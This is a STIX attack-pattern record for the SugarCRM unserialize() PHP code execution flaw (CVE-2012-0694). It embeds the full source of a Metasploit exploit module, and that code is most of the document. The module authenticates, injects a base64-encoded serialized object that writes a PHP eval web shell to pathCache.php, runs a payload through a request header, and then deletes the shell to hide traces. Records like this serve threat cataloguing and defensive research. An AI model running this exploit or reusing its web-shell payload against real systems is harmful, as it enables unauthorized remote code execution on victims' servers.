{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fd93f310-20ec-465a-bf43-0149b2c4dd8f",
    "created": "2024-08-14T17:13:28.059985Z",
    "modified": "2024-08-14T17:13:28.059989Z",
    "name": "SugarCRM unserialize() PHP Code Execution",
    "description": " This module exploits a php unserialize() vulnerability in SugarCRM <= 6.3.1 which could be abused to allow authenticated SugarCRM users to execute arbitrary code with the permissions of the webserver.  The dangerous unserialize() exists in the 'include/MVC/View/views/view.list.php' script, which is called with user controlled data from the 'current_query_by_page' parameter. The exploit abuses the __destruct() method from the SugarTheme class to write arbitrary PHP code to a 'pathCache.php' on the web root. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/sugarcrm_unserialize_exec.rb",
            "external_id": "sugarcrm_unserialize_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0694"
        },
        {
            "source_name": "reference",
            "url": "http://www.sugarcrm.com/forums/f22/critical-security-vulnerability-76537/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SugarCRM unserialize() PHP Code Execution',\n        'Description' => %q{\n          This module exploits a php unserialize() vulnerability in SugarCRM <= 6.3.1\n          which could be abused to allow authenticated SugarCRM users to execute arbitrary\n          code with the permissions of the webserver.\n\n          The dangerous unserialize() exists in the 'include/MVC/View/views/view.list.php'\n          script, which is called with user controlled data from the 'current_query_by_page'\n          parameter. The exploit abuses the __destruct() method from the SugarTheme class\n          to write arbitrary PHP code to a 'pathCache.php' on the web root.\n        },\n        'Author' => [\n          'EgiX', # Vulnerability discovery and PoC\n          'juan vazquez', # Metasploit module\n          'sinn3r' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2012-0694' ],\n          [ 'OSVDB', '83361' ],\n          [ 'EDB', '19381' ],\n          [ 'URL', 'http://www.sugarcrm.com/forums/f22/critical-security-vulnerability-76537/' ]\n        ],\n        'Privileged' => false,\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'Payload' => {\n          'DisableNops' => true,\n        },\n        'Targets' => [ ['Automatic', {}], ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2012-06-23',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI',\t[ true, \"The base path to the web application\", \"/sugarcrm/\"]),\n        OptString.new('USERNAME', [true, \"The username to authenticate with\" ]),\n        OptString.new('PASSWORD', [true, \"The password to authenticate with\" ])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def on_new_session(client)\n    if client.type == \"meterpreter\"\n      f = \"pathCache.php\"\n      client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n      begin\n        print_warning(\"Deleting #{f}\")\n        client.fs.file.rm(f)\n        print_good(\"#{f} removed to stay ninja\")\n      rescue\n        print_warning(\"Unable to remove #{f}\")\n      end\n    end\n  end\n\n  def exploit\n    base = normalize_uri(target_uri.path)\n\n    username = datastore['USERNAME']\n    password = datastore['PASSWORD']\n\n    # Can't use vars_post because it'll escape \"_\"\n    data = \"module=Users&\"\n    data << \"action=Authenticate&\"\n    data << \"user_name=#{username}&\"\n    data << \"user_password=#{password}\"\n\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(base, \"index.php\"),\n        'method' => \"POST\",\n        'headers' =>\n          {\n            'Cookie' => \"PHPSESSID=1\",\n          },\n        'data' => data\n      }\n    )\n    if res.nil? || (res.headers['Location'] && res.headers['Location'].include?('action=Login')) || res.get_cookies.empty?\n      fail_with(Failure::NoAccess, \"#{peer} - Login failed with \\\"#{username}:#{password}\\\"\")\n    end\n\n    if res.get_cookies =~ /PHPSESSID=([A-Za-z0-9]*); path/\n      session_id = $1\n    elsif res.get_cookies =~ /PHPSESSID=([A-Za-z0-9]*);/\n      session_id = $1\n    else\n      fail_with(Failure::NoAccess, \"#{peer} - Login failed with \\\"#{username}:#{password}\\\" (No session ID)\")\n    end\n\n    print_good(\"Login Successful (#{username}:#{password})\")\n\n    data = \"module=Contacts&\"\n    data << \"Contacts2_CONTACT_offset=1&\"\n    data << \"current_query_by_page=\"\n    # O:10:\"SugarTheme\":2:{s:10:\"*dirName\";s:5:\"../..\";s:20:\"SugarTheme_jsCache\";s:49:\"<?php eval(base64_decode($_SERVER[HTTP_CMD])); ?>\";}\n    data << \"TzoxMDoiU3VnYXJUaGVtZSI6Mjp7czoxMDoiACoAZGlyTmFtZSI7czo1OiIuLi8uLiI7czoyMDoiAFN1Z2FyVGhlbWUAX2pzQ2FjaGUiO3M6NDk6Ijw/cGhwIGV2YWwoYmFzZTY0X2RlY29kZSgkX1NFUlZFUltIVFRQX0NNRF0pKTsgPz4iO30=\"\n\n    print_status(\"Exploiting the unserialize()\")\n\n    res = send_request_cgi(\n      {\n        'uri' => \"#{base}index.php\",\n        'method' => 'POST',\n        'headers' =>\n        {\n          'Cookie' => \"PHPSESSID=#{session_id};\",\n        },\n        'data' => data\n      }\n    )\n\n    unless res && res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Exploit failed: #{res.code}\")\n    end\n\n    print_status(\"Executing the payload\")\n\n    res = send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => \"#{base}pathCache.php\",\n        'headers' => {\n          'Cmd' => Rex::Text.encode_base64(payload.encoded)\n        }\n      }\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-06-23",
    "x_mitre_platforms": [
        "['php']"
    ]
}